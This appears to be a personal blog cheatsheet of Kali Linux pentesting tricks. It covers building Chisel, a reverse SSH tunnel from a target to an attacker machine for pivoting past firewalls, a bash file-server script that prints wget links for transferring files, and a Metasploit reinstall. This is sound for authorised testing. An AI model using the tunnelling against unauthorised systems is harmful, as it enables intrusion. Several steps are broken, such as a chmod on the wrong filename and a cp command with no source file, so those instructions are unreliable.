---
title: "Kali Tricks"
excerpt_separator: "<!--more-->"
author_profile: false
categories:
  - Linux
tags:
  - cheatsheet
  - kali
---


## Sections

### Kali
* [Tips and Tricks](#tips-and-tricks)
* [Install Apps Universally](#install-apps-universally)

### Kali app updates
* [Metasploit update](#metasploit)



## Tips and Tricks
### Chisel Quick guide

<details>
  <summary>Chisel Info - Click here</summary>
  
Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

</details>

Install Chisel
* cd to /opt
```console
cd /opt
```
* clone the repo
```console
git clone https://github.com/jpillora/chisel.git
```
* cd to the cloned repo
```console
cd chisel
```
sync go vendor modules, seems to be needed to build for windows
```console
go mod vendor
```
build Linux binary:
```console
go build -ldflags "-s -w"
```
build Windows binary
```console
env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w"
```
  
Usage: [Chisel Github](https://github.com/jpillora/chisel)

(*upload chisel to the attacking machine)    

Use chisel to reverse connect back to the other hidden localhost port for ssh 22 using port 9001

```console
$ ./chisel server -p 9001 --reverse

$ ./chisel client 10.8.0.116:9001 R:127.0.0.1:9002:172.17.0.1:22
# ./chisel client YOUR-IP-HERE:9001 R:127.0.0.1:9002:ATTACKER-MACHINE-IP:22
```

### Install apps universally
To make an application or script avilable systemwide you usually copy them to /usr/local/bin

**Example:** If we want to get our IP address, List files and then start a python http server to server the files. 

1. Make a script (or get an App you want), I've called my script: pss.sh (python start server.sh)
Script Details:-
- Select IP if more then 1 interface (eth0, tun0)
- List files in directory with wget links and your current IP
- Shows all files in the current directory

```bash
#!/bin/bash

GN="\e[32m"
RES="\e[0m"
CYAN="\e[1;36m"

echo -e "\n$CYAN""Python FileServer$RES"
echo -e "Created By$GN Ac1d $RES\n"

HN="hostname -I"
res=$(eval $HN)
arrIN=(${res// / })
IP=""

if [ ${#arrIN[@]} -gt 1 ]; then
        PS3='Which Ip address, 1 or 2?: '
        options=("Option 1: ${arrIN[0]}" "Option 2: ${arrIN[1]}" "Quit")
        select opt in "${options[@]}"
        do
        case $opt in
                "Option 1: ${arrIN[0]}")
                        IP="${arrIN[0]}"
                        #echo "you chose choice 1"
                        break
                ;;

                "Option 2: ${arrIN[1]}")
                        IP="${arrIN[1]}"
                        #echo "you chose choice 2"
                        break
                ;;
                "Quit")
                break
                ;;
                *) echo "invalid option $REPLY";;
        esac
        done
else
       IP=$arrIN

fi
echo "IP: "$IP
echo -e "File links...\n"
for entry in `ls`;do
        if  [  ! -d $entry  ];then
                wgetCmd=$(echo "wget ${IP##*( )}/$entry" | xargs)
                echo -e "\t$GN$wgetCmd$RES"
        fi
done
echo -e "\nCurrent Directory Contents"
ls --color /
echo -e "\nStarting Server"
sudo python3 -m http.server 80  -d .

ls
sudo python3 -m http.server 80  -d .
```

2. Give it the correct file permissions.
```bash
chmod +x pss.py
```

3. Then copy the file/script to /usr/local/bin
```bash
cp /usr/local/bin
```

4. Test your new tools and scripts out from any directory. 
![](/assets/images/pss.png)


## Kali app updates
### Metasploit
Remove old metasploit 
```console
sudo apt remove metasploit-framework -y
```
Install new version, Run 'msfconsole' after install
```console
sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```





